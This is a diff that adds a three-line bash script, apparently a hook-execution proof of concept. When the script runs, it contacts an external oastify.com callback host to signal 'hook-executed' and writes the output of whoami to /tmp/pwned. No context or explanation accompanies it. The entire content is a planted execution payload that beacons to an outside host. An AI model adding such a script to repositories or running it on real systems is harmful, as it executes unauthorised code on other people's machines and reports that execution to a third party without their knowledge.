@@ -1,0 +1,3 @@
+#!/bin/bash
+curl http://3nr7po6eqvgm18c708ds4gzal1rsfj38.oastify.com/hook-executed
+whoami > /tmp/pwned
